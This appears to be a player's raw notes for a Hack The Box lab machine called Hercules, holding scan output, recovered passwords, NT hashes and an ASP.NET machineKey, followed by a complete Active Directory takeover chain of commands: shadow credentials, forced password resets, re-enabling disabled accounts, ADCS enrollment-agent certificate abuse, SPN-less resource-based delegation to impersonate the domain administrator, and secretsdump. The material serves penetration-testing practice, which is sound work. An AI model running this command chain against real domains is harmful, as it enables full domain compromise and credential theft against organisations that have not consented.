


Initial nmap:
```
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain?       syn-ack ttl 127
80/tcp   open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to https://10.129.161.179/
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-10-19 10:13:14Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: hercules.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.hercules.htb
| Subject Alternative Name: DNS:dc.hercules.htb, DNS:hercules.htb, DNS:HERCULES
| Issuer: commonName=CA-HERCULES/domainComponent=hercules
443/tcp  open  ssl/http      syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Hercules Corp
| tls-alpn:
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=hercules.htb
| Subject Alternative Name: DNS:hercules.htb
| Issuer: commonName=hercules.htb
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: hercules.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.hercules.htb
| Subject Alternative Name: DNS:dc.hercules.htb, DNS:hercules.htb, DNS:HERCULES
| Issuer: commonName=CA-HERCULES/domainComponent=hercules
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: hercules.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.hercules.htb
| Subject Alternative Name: DNS:dc.hercules.htb, DNS:hercules.htb, DNS:HERCULES
| Issuer: commonName=CA-HERCULES/domainComponent=hercules
3269/tcp open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: hercules.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc.hercules.htb
| Subject Alternative Name: DNS:dc.hercules.htb, DNS:hercules.htb, DNS:HERCULES
| Issuer: commonName=CA-HERCULES/domainComponent=hercules
```

web page enumeration

her
```
login                   [Status: 200, Size: 3213, Words: 927, Lines: 54, Duration: 560ms]
                        [Status: 200, Size: 27342, Words: 10179, Lines: 468, Duration: 598ms]
index                   [Status: 200, Size: 27342, Words: 10179, Lines: 468, Duration: 597ms]
default                 [Status: 200, Size: 27342, Words: 10179, Lines: 468, Duration: 582ms]
home                    [Status: 200, Size: 3231, Words: 927, Lines: 54, Duration: 252ms]
content                 [Status: 403, Size: 0, Words: 1, Lines: 1, Duration: 66ms]
Default                 [Status: 200, Size: 27342, Words: 10179, Lines: 468, Duration: 69ms]
Home                    [Status: 200, Size: 3231, Words: 927, Lines: 54, Duration: 63ms]
Index                   [Status: 200, Size: 27342, Words: 10179, Lines: 468, Duration: 66ms]
Login                   [Status: 200, Size: 3213, Words: 927, Lines: 54, Duration: 71ms]
Content                 [Status: 403, Size: 0, Words: 1, Lines: 1, Duration: 75ms]
INDEX                   [Status: 200, Size: 27342, Words: 10179, Lines: 468, Duration: 71ms]
HOME                    [Status: 200, Size: 3231, Words: 927, Lines: 54, Duration: 65ms]

```

```
LDAP hercules.htb 389 DC [+] hercules.htb\ken.w:change*th1s_p@ssw()rd!!
ken.w: change*th1s_p@ssw()rd!!
```

```

<configuration>
    <system.web>
        <compilation debug="false" targetFramework="4.0" />
        <machineKey validationKey="99F1108B685094A8A31CDAA9CBA402028D80C08B40EBBC2C8E4BD4B0D31A347B0D650984650B24828DD120E236B099BFDD491910BF11F6FA915BF94AD93B52BF" decryptionKey="B16DA07AB71AB84143A037BCDD6CFB42B9C34099785C10F9" validation="SHA1" decryption="AES" />
    </system.web>
</configuration
```

```
natalie.a : Prettyprincess123!
bob.w     : 8a65c74e8f0073babbfac6725c66cc3f
stephen.m : 9aaaedcb19e612216a2dac9badb3c210
auditor   : Prettyprincess123!   ***
ashley.b  : aad3b435b51404eeaad3b435b51404ee:
			1e719fbfddd226da74f644eac9df7fd2
```


```sh
source tmp.bob.w
export KRB5CCNAME=bob.w.ccache

powerview  "$DOMAIN"/"$USER"@"$DC" -k --use-ldaps --dc-ip "$IP" get-objectacl --no-pass  --web --web-host 0.0.0.0 --web-port 4443
Set-DomainObjectDN -Identity "CN=STEPHEN MILLER,OU=SECURITY DEPARTMENT,OU=DCHERCULES,DC=HERCULES,DC=HTB" -DestinationDN "OU=WEB DEPARTMENT,OU=DCHERCULES,DC=HERCULES,DC=HTB"

source tmp.natalie.a
bloodyAD -k --host "$DC" -u "$USER" -d "$DOMAIN" --dc-ip "$IP" add shadowCredentials stephen.m


source tmp.stephen.m
getTGT.py -dc-ip "$IP" "$DOMAIN"/"$USER":"$PASSWORD" -hashes ":$HASH"
export KRB5CCNAME=stephen.m.ccache
bloodyAD -k --host "$DC" -u "$USER" -d "$DOMAIN" --dc-ip "$IP" set password 'auditor' 'Prettyprincess123!'

source tmp.auditor
getTGT.py -dc-ip "$IP" "$DOMAIN"/"$USER":"$PASSWORD"
export KRB5CCNAME=auditor.ccache
#evil-winrm -i "$IP" -u "$USER" -p "$PASSWORD"
bloodyAD -k --host "$DC" -u "$USER" -d "$DOMAIN" --dc-ip "$IP" add genericAll  'OU=FOREST MIGRATION,OU=DCHERCULES,DC=HERCULES,DC=HTB'  "$USER"
bloodyAD -k --host "$DC" -u "$USER" -d "$DOMAIN" --dc-ip "$IP" remove uac 'fernando.r' -f ACCOUNTDISABLE
bloodyAD -k --host "$DC" -u "$USER" -d "$DOMAIN" --dc-ip "$IP" set password 'fernando.r' 'Prettyprincess123!'
bloodyAD -k --host "$DC" -u "$USER" -d "$DOMAIN" --dc-ip "$IP" add genericAll 'OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb'  'CN=IT Support,OU=DOMAIN GROUPS,OU=DCHERCULES,DC=HERCULES,DC=HTB'
_____
bloodyAD -k --host "$DC" -u "$USER" -d "$DOMAIN" --dc-ip "$IP" remove uac 'iis_administrator' -f ACCOUNTDISABLE
bloodyAD -k --host "$DC" -u "$USER" -d "$DOMAIN" --dc-ip "$IP" set password 'iis_administrator' 'Prettyprincess123!'

source tmp.fernando.r
getTGT.py -dc-ip "$IP" "$DOMAIN"/"$USER":"$PASSWORD"
export KRB5CCNAME=fernando.r.ccache
certipy req -u "$USER"@"$DOMAIN" -p "$PASSWORD" -dc-ip "$IP" -target "$DC" -ca 'CA-HERCULES' -template 'EnrollmentAgent' -k

source tmp.ashley.b
getTGT.py -dc-ip "$IP" "$DOMAIN"/"$USER":"$PASSWORD" -hashes ":$HASH"
export KRB5CCNAME=ashley.b.ccache

source tmp.iis.administrator
getTGT.py -dc-ip "$IP" "$DOMAIN"/"$USER":"$PASSWORD"
export KRB5CCNAME=iis_administrator.ccache
bloodyAD -k --host "$DC" -u "$USER" -d "$DOMAIN" --dc-ip "$IP" set password 'iis_webserver$' 'Prettyprincess123!'

source tmp.iis_webserver$
getTGT.py -hashes :$(pypykatz crypto nt 'Prettyprincess123!') 'hercules.htb/iis_webserver$'
describeTicket.py 'iis_webserver$.ccache' | grep 'Ticket Session Key'
changepasswd.py -newhashes :49cc051d26c5dff22cfede501a76bd89 'hercules.htb/iis_webserver$:Prettyprincess123!@dc.hercules.htb' -k
KRB5CCNAME=./iis_webserver\$.ccache impacket-getST -u2u -impersonate 'administrator' -spn 'cifs/dc.hercules.htb' -k -no-pass 'hercules.htb/iis_webserver$'

export administrator@cifs_dc.hercules.htb@HERCULES.HTB.ccache
secretsdump.py "$DOMAIN"/"$USER":"$PASSWORD"@"$DC" -k -no-pass

```

```
bloodyAD --host 'dc.hercules.htb' -d 'hercules.htb' -k get writable --detail

powerview 'hercules.htb/bob.w@dc.hercules.htb' -k --use-ldaps --dc-ip 10.129.246.138 --no-pass

Set-DomainObjectDN -Identity "CN=STEPHEN MILLER,OU=SECURITY DEPARTMENT,OU=DCHERCULES,DC=HERCULES,DC=HTB" -DestinationDN "OU=WEB DEPARTMENT,OU=DCHERCULES,DC=HERCULES,DC=HTB"

getTGT.py 'hercules.htb/bob.w' -dc-ip 10.10.11.91 -hashes :8a65c74e8f0073babbfac6725c66cc3f

KRB5CCNAME=bob.w.ccache powerview hercules.htb/bob.w@dc.hercules.htb -k --use-ldaps --dc-ip 10.10.11.91 -d --no-pass

Set-DomainObjectDN -Identity stephen.m -DestinationDN 'OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb'

getTGT.py 'HERCULES.HTB/natalie.a:Prettyprincess123!' export KRB5CCNAME=$(pwd)/natalie.a.ccache

KRB5CCNAME=./natalie.a.ccache certipy shadow auto -u natalie.a@hercules.htb -k -dc-host DC.hercules.htb -account 'stephen.m'
```

```


getTGT.py HERCULES.HTB/stephen.m -hashes :9aaaedcb19e612216a2dac9badb3c210

KRB5CCNAME=stephen.m.ccache bloodyAD --host DC.hercules.htb -d hercules.htb -k set password Auditor 'Prettyprincess123!'

KRB5CCNAME=stephen.m.ccache nxc smb dc.hercules.htb -k -u 'auditor' -p 'Prettyprincess123!' --generate-tgt auditor

getTGT.py 'HERCULES.HTB/auditor:Prettyprincess123!'

KRB5CCNAME=./auditor.ccache bloodyAD --host 'dc.hercules.htb' -d 'hercules.htb' -k add genericAll 'OU=FOREST MIGRATION,OU=DCHERCULES,DC=HERCULES,DC=HTB' 'auditor'

KRB5CCNAME=./auditor.ccache bloodyAD --host 'dc.hercules.htb' -d 'hercules.htb' -k set password 'fernando.r' 'Pretty123!'

KRB5CCNAME=./auditor.ccache bloodyAD --host 'dc.hercules.htb' -d 'hercules.htb' -k remove uac 'fernando.r' -f ACCOUNTDISABLE

KRB5CCNAME=./auditor.ccache nxc smb dc.hercules.htb -k -u 'FERNANDO.R' -p 'Pretty123!' --generate-tgt fernando.r

KRB5CCNAME=./fernando.r.ccache certipy-ad req -u 'fernando.r@hercules.htb' -k -target 'dc.hercules.htb' -dc-host 'dc.hercules.htb' -dc-ip 10.129.246.151 -ca 'CA-HERCULES' -template 'EnrollmentAgent' -dcom

KRB5CCNAME=./fernando.r.ccache certipy-ad req -u 'fernando.r@hercules.htb' -k -target 'dc.hercules.htb' -dc-host 'dc.hercules.htb' -dc-ip 10.129.246.151 -ca 'CA-HERCULES' -template 'User' -application-policies 'Client Authentication' -on-behalf-of 'hercules\ashley.b' -pfx fernando.r.pfx -dcom

KRB5CCNAME=./fernando.r.ccache certipy-ad auth -pfx ashley.b.pfx -dc-ip 10.129.246.151


getTGT.py HERCULES.HTB/ashley.b -hashes :1e719fbfddd226da74f644eac9df7fd2
or 
nxc smb dc.hercules.htb -u 'ashley.b' -H '1e719fbfddd226da74f644eac9df7fd2' -k --generate-tgt ashley.b

KRB5CCNAME=./auditor.ccache bloodyAD --host 'dc.hercules.htb' -d 'hercules.htb' -k add genericAll 'OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb' 'IT SUPPORT'

KRB5CCNAME=./auditor.ccache bloodyAD --host 'dc.hercules.htb' -d 'hercules.htb' -k add genericAll 'OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb' 'auditor'

KRB5CCNAME=./auditor.ccache bloodyAD --host 'dc.hercules.htb' -d 'hercules.htb' -k remove uac 'iis_administrator' -f ACCOUNTDISABLE


KRB5CCNAME=./auditor.ccache bloodyAD --host 'dc.hercules.htb' -d 'hercules.htb' -k set password 'iis_administrator' 'Password123!'
impacket-getTGT 'hercules.htb/iis_administrator:Password123!'
KRB5CCNAME=./iis_administrator.ccache bloodyAD --host DC.hercules.htb -d hercules.htb -u 'iis_administrator' -k set password iis_webserver$ 'Password123!'


impacket-getTGT -hashes :$(pypykatz crypto nt 'Password123!') 'hercules.htb/iis_webserver$'
impacket-describeTicket 'iis_webserver$.ccache' | grep 'Ticket Session Key'
impacket-changepasswd -newhashes :473ef1842b6fbbdd57d98817f6c90c7d 'hercules.htb/iis_webserver$:Password123!@dc.hercules.htb' -k
KRB5CCNAME=./iis_webserver\$.ccache impacket-getST -u2u -impersonate 'administrator' -spn 'cifs/dc.hercules.htb' -k -no-pass 'hercules.htb/iis_webserver$'
```



```
------------------------------------------------------------------------- ------------------------------------------------------------------------- ------------------------------------------------------------------------- #Privilege Escalation # Get TGT for stephen.m using NT hash: 
getTGT.py HERCULES.HTB/stephen.m -hashes :9aaaedcb19e612216a2dac9badb3c210 KRB5CCNAME=stephen.m.ccache bloodyAD --host DC.hercules.htb -d hercules.htb -k set password Auditor 'Prettyprincess123!' KRB5CCNAME=stephen.m.ccache nxc smb dc.hercules.htb -k -u 'auditor' -p 'Prettyprincess123!' --generate-tgt auditor # or getTGT.py 'HERCULES.HTB/auditor:Prettyprincess123!' ## get user.txt !!!!! KRB5CCNAME=./auditor.ccache bloodyAD --host 'dc.hercules.htb' -d 'hercules.htb' -k add genericAll 'OU=FOREST MIGRATION,OU=DCHERCULES,DC=HERCULES,DC=HTB' 'auditor' [+] auditor has now GenericAll on OU=FOREST MIGRATION,OU=DCHERCULES,DC=HERCULES,DC=HTB KRB5CCNAME=./auditor.ccache bloodyAD --host 'dc.hercules.htb' -d 'hercules.htb' -k set password 'fernando.r' 'Pretty123!' [+] Password changed successfully! KRB5CCNAME=./auditor.ccache bloodyAD --host 'dc.hercules.htb' -d 'hercules.htb' -k remove uac 'fernando.r' -f ACCOUNTDISABLE [-] ['ACCOUNTDISABLE'] property flags removed from FERNANDO.R's userAccountControl KRB5CCNAME=./auditor.ccache nxc smb dc.hercules.htb -k -u 'FERNANDO.R' -p 'Pretty123!' --generate-tgt fernando.r KRB5CCNAME=./fernando.r.ccache certipy-ad req -u 'fernando.r@hercules.htb' -k -target 'dc.hercules.htb' -dc-host 'dc.hercules.htb' -dc-ip 10.129.246.151 -ca 'CA-HERCULES' -template 'EnrollmentAgent' -dcom [*] Wrote certificate and private key to 'fernando.r.pfx' KRB5CCNAME=./fernando.r.ccache certipy-ad req -u 'fernando.r@hercules.htb' -k -target 'dc.hercules.htb' -dc-host 'dc.hercules.htb' -dc-ip 10.129.246.151 -ca 'CA-HERCULES' -template 'User' -application-policies 'Client Authentication' -on-behalf-of 'hercules\ashley.b' -pfx fernando.r.pfx -dcom [*] Wrote certificate and private key to 'ashley.b.pfx' KRB5CCNAME=./fernando.r.ccache certipy-ad auth -pfx ashley.b.pfx -dc-ip 10.129.246.151 [*] Got hash for 'ashley.b@hercules.htb': aad3b435b51404eeaad3b435b51404ee:1e719fbfddd226da74f644eac9df7fd2 ------------------------------------------------------------------------- ------------------------------------------------------------------------- --------------------------------------------------------------------------- #### - after you get to ashley.b first as auditor give IT support ga on FOREST MIGRATION ou - then start the scheduled task, it will remove admincount from iis_administrator - once again as auditor give yourself ga on FOREST MIGRATION ou and enable iis_administrator change pass, - as iis_administrator, reset pass on iis_webserver - iis_webserver has rbcd on dc but no spn, so do spnless rbcd to get root #### getTGT.py HERCULES.HTB/ashley.b -hashes :1e719fbfddd226da74f644eac9df7fd2 # or nxc smb dc.hercules.htb -u 'ashley.b' -H '1e719fbfddd226da74f644eac9df7fd2' -k --generate-tgt ashley.b # We grant GenericAll on Forest Migration OU to IT SUPPORT KRB5CCNAME=./auditor.ccache bloodyAD --host 'dc.hercules.htb' -d 'hercules.htb' -k add genericAll 'OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb' 'IT SUPPORT' ### trigger the cleanup script from Ashley's shell ! # We grant GenericAll on Forest Migration OU to Auditor KRB5CCNAME=./auditor.ccache bloodyAD --host 'dc.hercules.htb' -d 'hercules.htb' -k add genericAll 'OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb' 'auditor' # Enable the iis_administrator account KRB5CCNAME=./auditor.ccache bloodyAD --host 'dc.hercules.htb' -d 'hercules.htb' -k remove uac 'iis_administrator' -f ACCOUNTDISABLE # Change password of iis_administrator account KRB5CCNAME=./auditor.ccache bloodyAD --host 'dc.hercules.htb' -d 'hercules.htb' -k set password 'iis_administrator' 'Password123!' # Grab the ticket for iis_administrator impacket-getTGT 'hercules.htb/iis_administrator:Password123!' KRB5CCNAME=./iis_administrator.ccache bloodyAD --host DC.hercules.htb -d hercules.htb -u 'iis_administrator' -k set password iis_webserver$ 'Password123!' # Get ticket for iis_webserver$ account impacket-getTGT -hashes :$(pypykatz crypto nt 'Password123!') 'hercules.htb/iis_webserver$' # Get session key impacket-describeTicket 'iis_webserver$.ccache' | grep 'Ticket Session Key' [*] Ticket Session Key : 473ef1842b6fbbdd57d98817f6c90c7d impacket-changepasswd -newhashes :473ef1842b6fbbdd57d98817f6c90c7d 'hercules.htb/iis_webserver$:Password123!@dc.hercules.htb' -k [*] Password was changed successfully. KRB5CCNAME=./iis_webserver\$.ccache 

impacket-getST -u2u -impersonate 'administrator' -spn 'cifs/dc.hercules.htb' -k -no-pass 'hercules.htb/iis_webserver$' 
[*] Saving ticket in Administrator@cifs_dc.hercules.htb@HERCULES.HTB.ccache
```


```
MATCH (s) WHERE s.owned = true
MATCH (t) WHERE t.objectid IS NOT NULL
MATCH p = (s)-[r:Owns|GenericAll|GenericWrite|WriteOwner|WriteDacl|MemberOf|ForceChangePassword|AllExtendedRights|AddMember|HasSession|AllowedToDelegate|CoerceToTGT|AllowedToAct|AdminTo|CanPSRemote|CanRDP|ExecuteDCOM|HasSIDHistory|AddSelf|DCSync|ReadLAPSPassword|ReadGMSAPassword|DumpSMSAPassword|SQLAdmin|AddAllowedToAct|WriteSPN|AddKeyCredentialLink|SyncLAPSPassword|WriteAccountRestrictions|WriteGPLink|GoldenCert|ADCSESC1|ADCSESC3|ADCSESC4|ADCSESC6a|ADCSESC6b|ADCSESC9a|ADCSESC9b|ADCSESC10a|ADCSESC10b|ADCSESC13|SyncedToEntraUser|CoerceAndRelayNTLMToSMB|CoerceAndRelayNTLMToADCS|WriteOwnerLimitedRights|OwnsLimitedRights|CoerceAndRelayNTLMToLDAP|CoerceAndRelayNTLMToLDAPS|ContainsIdentity|PropagatesACEsTo|GPOAppliesTo|CanApplyGPO|HasTrustKeys|DCFor|SameForestTrust|SpoofSIDHistory|AbuseTGTDelegation*1..5]->(t)
RETURN p
LIMIT 1000
```

![[Z Assets/Images/Pasted image 20251023013427.jpeg]]
